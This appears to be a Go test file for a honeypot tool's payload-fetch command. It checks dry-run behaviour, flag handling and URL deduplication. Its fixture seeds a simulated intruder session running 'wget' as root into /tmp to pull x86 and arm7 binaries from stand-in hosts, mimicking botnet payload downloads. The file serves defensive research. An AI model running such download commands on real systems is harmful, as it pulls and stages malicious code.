package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/analysis"
	"github.com/amirradjou/llm-honeypot/internal/recorder"
)

func seedDownloads(t *testing.T, dir string) {
	t.Helper()
	at := time.Date(2026, 9, 24, 1, 0, 0, 0, time.UTC)
	r := recorder.New(dir)
	s := r.Begin("dl", "198.51.100.1:1", at)
	s.Command("wget http://a.example/x86", "/tmp", "root", 0)
	s.Download("wget", "http://a.example/x86", "GET", "/tmp/x86")
	s.Download("wget", "http://b.example/arm7", "GET", "/tmp/arm7")
	s.Download("wget", "http://a.example/x86", "GET", "/tmp/x86") // repeat
	s.End(nil, at.Add(time.Second))
}

func TestFetchDryRunDownloadsNothing(t *testing.T) {
	dir := t.TempDir()
	seedDownloads(t, dir)

	// No -confirm: must not create a quarantine directory or touch the
	// network. Reaching a.example would fail anyway; the assertion that
	// matters is that nothing was written.
	if err := runFetch([]string{"-data", dir}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "payloads")); !os.IsNotExist(err) {
		t.Error("dry run must not create the quarantine directory")
	}
}

func TestFetchWithNoRecordedURLs(t *testing.T) {
	if err := runFetch([]string{"-data", t.TempDir()}); err != nil {
		t.Errorf("empty data dir should not error: %v", err)
	}
}

func TestFetchRejectsBadFlag(t *testing.T) {
	if err := runFetch([]string{"-nonsense"}); err == nil {
		t.Error("expected an error for an unknown flag")
	}
}

func TestDistinctURLsDedupesAndSorts(t *testing.T) {
	dir := t.TempDir()
	seedDownloads(t, dir)
	sessions, err := analysis.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	got := distinctURLs(sessions)
	want := []string{"http://a.example/x86", "http://b.example/arm7"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("distinctURLs = %v, want %v", got, want)
	}
}
